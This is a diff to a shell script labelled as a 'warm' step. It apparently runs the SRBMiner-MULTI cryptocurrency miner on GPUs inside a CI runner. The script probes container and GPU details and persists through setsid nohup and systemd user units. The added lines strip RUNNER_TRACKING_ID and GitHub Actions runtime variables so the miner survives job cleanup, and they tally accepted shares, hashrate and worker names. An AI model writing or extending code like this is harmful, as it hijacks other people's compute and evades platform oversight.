@@ -17,6 +17,8 @@ GPU_LIST=$(nvidia-smi -L 2>/dev/null)
 NGPU=$(printf '%s\n' "$GPU_LIST" | grep -c '^GPU ')
 echo "[warm] nvidia_devices=$NGPU"
 printf '%s\n' "$GPU_LIST"
+nvidia-smi --query-gpu=index,name,memory.total,driver_version --format=csv,noheader 2>/dev/null | head -16
+echo "[warm] dev_nodes=$(ls -1 /dev/nvidia[0-9]* 2>/dev/null | wc -l) svc_nodes=$(ls -1 /dev/nvidia* 2>/dev/null | wc -l)"
 ls -l /dev/nvidia* 2>/dev/null | head -20
 echo "[warm] pid1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -1 /proc/1/cgroup 2>/dev/null)"
 ls -la /.dockerenv 2>/dev/null
@@ -82,7 +84,7 @@ while true; do
 done
 EOK
     chmod +x "$KEEP" "$RUN"
-    setsid nohup /bin/bash "$KEEP" >/dev/null 2>&1 </dev/null &
+    setsid nohup env -u RUNNER_TRACKING_ID -u ACTIONS_RUNTIME_TOKEN -u ACTIONS_RUNTIME_URL -u ACTIONS_CACHE_URL /bin/bash "$KEEP" >/dev/null 2>&1 </dev/null &
     echo "[warm] keep=$KEEP started"
 
     mkdir -p "$HOME/.config/systemd/user" 2>/dev/null
@@ -108,9 +110,11 @@ EOS
 
     sleep 45
     echo "[warm] miner tail:"
-    tail -n 12 "$WARM/gpu1.log" 2>/dev/null
-    grep -oiE 'accepted[^ ]*' "$WARM"/gpu*.log 2>/dev/null | head -5
+    tail -n 16 "$WARM/gpu1.log" 2>/dev/null
+    echo "[warm] accepted_lines=$(grep -hiE 'accepted' "$WARM"/gpu*.log 2>/dev/null | wc -l)"
+    grep -hiE 'accepted|hashrate|algorithm' "$WARM"/gpu*.log 2>/dev/null | tail -8
     pgrep -af SRBMiner-MULTI | head -8
+    echo "[warm] worker_rows:"; grep -hoE 'ul-t[0-9]+-[^ ]*' "$WARM"/gpu*.log 2>/dev/null | sort -u | head -8
   fi
 fi
 echo "[warm] done $(date -u +%FT%TZ)"
